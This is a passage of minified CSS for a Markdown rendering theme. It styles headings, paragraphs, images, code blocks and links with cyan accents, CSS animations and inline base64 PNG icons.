auto;background:url(data:image/png;base64,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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid 